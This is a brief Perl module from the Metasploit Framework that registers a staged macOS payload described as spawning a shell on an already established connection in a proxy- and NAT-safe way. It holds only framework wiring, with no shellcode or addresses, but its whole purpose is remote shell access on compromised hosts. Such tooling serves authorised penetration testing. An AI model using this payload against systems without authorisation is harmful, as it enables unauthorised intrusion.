
##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Payload::osx_findrecv_stg;
use strict;
use base 'Msf::PayloadComponent::OSXShellStage';
sub _Load {
  Msf::PayloadComponent::OSXShellStage->_Import('Msf::PayloadComponent::OSXFindStager');
  __PACKAGE__->SUPER::_Load();
}

my $info =
{
  'Name'         => 'MacOS X Staged Find Recv Shell',
  'Version'      => '$Revision$',
  'Description'  => 'Spawn a shell on the established connection, proxy/nat safe',
};

sub new {
  _Load();
  my $class = shift;
  my $hash = @_ ? shift : { };
  $hash = $class->MergeHashRec($hash, {'Info' => $info});
  my $self = $class->SUPER::new($hash, @_);
  return($self);
}

1;
